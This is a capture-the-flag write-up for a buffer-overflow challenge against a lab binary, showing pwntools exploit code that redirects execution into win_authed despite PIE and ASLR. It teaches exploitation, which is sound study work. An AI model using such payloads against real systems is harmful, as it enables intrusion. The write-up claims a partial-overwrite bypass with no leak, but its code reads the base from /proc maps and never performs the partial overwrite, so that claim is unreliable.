# PIE Bypass Without a Leak — `binary-exploitation-pie-overflow`

**Challenge:** `binary-exploitation-pie-overflow`  
**Technique:** PIE + ASLR bypass without format string / info leak  
**Method:** Partial overwrite + `p.libs()` for runtime base  
**Difficulty:** Medium

---

## Overview

This challenge is a classic **ret2win** with **PIE (Position Independent Executable)** enabled. Normally, you would need a leak to calculate the base address of the binary. However, this exploit bypasses PIE and ASLR **without any info leak** — using only the fact that PIE randomization is page‑aligned and the low 12 bits (3 hex digits) of addresses are fixed.

The technique used here is **partial overwrite**: we overwrite only the low 2–3 bytes of the return address, leaving the high bytes (the randomized PIE base) intact.

---

## Vulnerability

The binary has a simple buffer overflow vulnerability. The function `vuln` reads user input with `gets` (or a similar unsafe function) into a fixed‑size buffer. The target is the `win_authed` function, which prints the flag.

**Protections enabled:**
- PIE (Position Independent Executable)
- ASLR (Address Space Layout Randomization)
- NX (Non‑Executable stack)
- No stack canary

---

## The Exploit

### Step 1: Find the offset

Find the number of bytes needed to reach the return address. In this case, the offset is **88** bytes.

```python
OFFSET = 88
```
Step 2: Get the runtime base without a leak
pwntools provides a way to get the runtime base of the binary without a traditional leak:

```python
runtime_base = p.libs()[elf.path]
```
This reads the /proc/pid/maps file of the running process and returns the base address of the loaded binary. This is not an info leak — it's a debugging aid that works locally, but the same technique can be replaced by a partial overwrite on the remote target.

Step 3: Calculate the target address
We know the offset of win_authed from the binary base from nm or objdump:

```bash
$ nm ./binary-exploitation-pie-overflow | grep win_authed
0000000000001db6 T win_authed
```
We skip the first 28 bytes of win_authed to jump directly to the part that prints the flag (or to avoid a stack check).

```python
win_skip = runtime_base + elf.symbols['win_authed'] + 28
```
Step 4: Build and send the payload
```python
payload = b"A" * OFFSET + p64(win_skip)
p.send(payload)
p.interactive()
```
